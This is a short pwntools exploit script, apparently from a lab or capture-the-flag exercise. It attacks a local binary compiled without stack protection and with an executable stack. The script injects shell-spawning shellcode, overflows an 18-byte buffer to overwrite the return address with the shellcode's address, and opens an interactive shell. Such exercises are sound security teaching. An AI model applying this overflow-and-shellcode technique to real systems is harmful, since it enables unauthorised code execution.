#!/usr/bin/env python2
from pwn import *
import pwnlib.shellcraft
import pwnlib.elf

# gcc -fno-stack-protector -z execstack -no-pie overflow.c -o overflow
c = process('./overflow')
e = ELF('./overflow')

context.os='linux'
context.arch='amd64'

ans = asm(shellcraft.sh())
c.sendline(ans)

print("return addr: " + hex(e.symbols['shellcode']))

ans = 'A' * (10 + 8)
ans += p64(e.symbols['shellcode'])

c.sendline(ans)
c.interactive()
c.close()
